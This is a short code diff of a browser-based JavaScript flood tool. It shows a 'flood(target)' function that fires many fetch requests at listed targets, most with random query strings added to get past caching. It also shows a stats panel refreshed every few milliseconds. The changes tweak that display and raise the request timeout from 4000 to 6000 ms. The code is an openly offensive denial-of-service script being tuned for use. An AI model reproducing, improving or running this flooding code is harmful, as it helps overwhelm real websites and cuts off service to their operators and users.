@@ -16,7 +16,7 @@ var targets = {
     var statsEl = document.getElementById('stats');
 
 function printStats() {
-    statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+    statsEl.innerHTML = '<b>----------------</b><pre>' + JSON.stringify(targets, null, 2) + '</pre><b>----------------</b>'
 }
 setInterval(printStats, 5);
 
@@ -45,7 +45,7 @@ async function flood(target) {
         rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 2800))
         queue.push(
             fetchWithTimeout(target + rand, {
-                timeout: 4000
+                timeout: 6000
             })
             .catch((error) => {
                 if (error.code === 20 /* ABORT */ ) {
